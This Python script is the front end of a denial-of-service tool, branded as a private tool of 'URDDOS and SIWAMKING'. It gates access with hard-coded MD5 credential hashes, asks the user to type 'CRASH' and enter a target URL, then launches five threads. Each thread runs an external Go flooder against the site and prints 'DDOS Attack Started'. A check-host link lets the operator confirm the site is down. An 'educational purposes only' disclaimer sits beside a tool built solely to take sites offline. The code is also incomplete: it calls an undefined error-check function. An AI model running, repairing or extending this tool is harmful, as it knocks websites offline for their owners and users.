import getpass
import os
import hashlib
from colorama import init, Fore
import threading
import subprocess
import time  # Import the time module for waiting

init()

mainu = "a3c51a6c750d9ffe04926da5e6bc491f"
mainup = "fd12cc0b06e6ead008d35ae16ba5d7c2"

def md5_hash(text):
    return hashlib.md5(text.encode()).hexdigest()

# Initialize a global variable to keep track of the total request count
total_requests = 0

def run_crash(url, method):
    global total_requests  # Access the global request count variable
    try:
        subprocess.run(['go', 'run', 'main.go', '-site', url, '-data', method], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        # Increment the total request count after each run
        total_requests += 1
    except Exception as e:
        print(f"Error occurred: {str(e)}")
        print("Restarting the current session...")

def authenticate():
    username = input("Enter your username: ")
    password = getpass.getpass("Enter your password: ")

    checku = md5_hash(username)
    checkp = md5_hash(password)

    if checku == mainu and checkp == mainup:
        print("Authentication successful.")
        return True
    else:
        print("Authentication failed. Access denied.")
        return False

def worker(session_num, url, method):
    print(f"Session {session_num + 1}: DDOS Attack Started...")
    error_count = 0

    while error_count < 5:
        run_crash(url, method)

        # Check if an error occurred (you need to implement this part)
        if error_occurred():
            error_count += 1
            print(f"Session {session_num + 1}: Error occurred (retry {error_count}/5). Retrying...")
        else:
            break

    if error_count == 5:
        print(f"Session {session_num + 1}: Maximum retry limit reached.")
    else:
        print(f"Session {session_num + 1}: Session completed successfully.")

def main():
    if not authenticate():
        return

    colored_text = (
        f"{Fore.YELLOW}"
        f" /$$   /$$ /$$$$$$$  /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$$\n"
        f"| $$  | $$| $$__  $$| $$__  $$| $$__  $$ /$$__  $$ /$$__  $$\n"
        f"| $$  | $$| $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/\n"
        f"| $$  | $$| $$$$$$$/| $$  | $$| $$  | $$| $$  | $$|  $$$$$$ \n"
        f"| $$  | $$| $$__  $$| $$  | $$| $$  | $$| $$  | $$ \____  $$\n"
        f"| $$  | $$| $$  \ $$| $$  | $$| $$  | $$| $$  | $$ /$$  \ $$\n"
        f"|  $$$$$$/| $$  | $$| $$$$$$$/| $$$$$$$/|  $$$$$$/| $$$$$$$/\n"
        f" \______/ |__/  |__/|_______/ |_______/  \______/  \______/ \n"
        f"{Fore.GREEN}PRIVATE TOOL BY URDDOS AND SIWAMKING{Fore.RESET}"
    )

    print(colored_text)
    print(f"{Fore.LIGHTBLUE_EX}Disclaimer:{Fore.RESET}")
    print(f"{Fore.LIGHTBLUE_EX}This script is provided for educational purposes only.{Fore.RESET}")
    print(f"{Fore.LIGHTBLUE_EX}Use it responsibly, and ensure you have proper authorization before testing it{Fore.RESET}")
    print(f"{Fore.LIGHTBLUE_EX}on any system or website. Unauthorized use of this script may violate laws and{Fore.RESET}")
    print(f"{Fore.LIGHTBLUE_EX}regulations, resulting in legal consequences. The author and contributors are not{Fore.RESET}")
    print(f"{Fore.LIGHTBLUE_EX}responsible for any misuse or damage caused by this script.{Fore.RESET}")

    method_choice = input("Type CRASH: ").strip()

    if method_choice == "CRASH":
        url = input(f"{Fore.GREEN}Enter the URL to target: {Fore.RESET}")
        method = "GET"

        # Print the host checking URL in pink color
        print(f"{Fore.LIGHTMAGENTA_EX}Host checking URL: https://check-host.net/check-http?host={url}{Fore.RESET}")

        session_count = 5  # Number of sessions
        threads = []

        print(f"{Fore.LIGHTBLUE_EX}Wait for a few minutes...{Fore.RESET}")

        for session_num in range(session_count):
            thread = threading.Thread(target=worker, args=(session_num, url, method))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()  # Wait for all threads to complete

        # Display the total request count
        print(f"Total requests sent: {total_requests}")

if __name__ == "__main__":
    main()
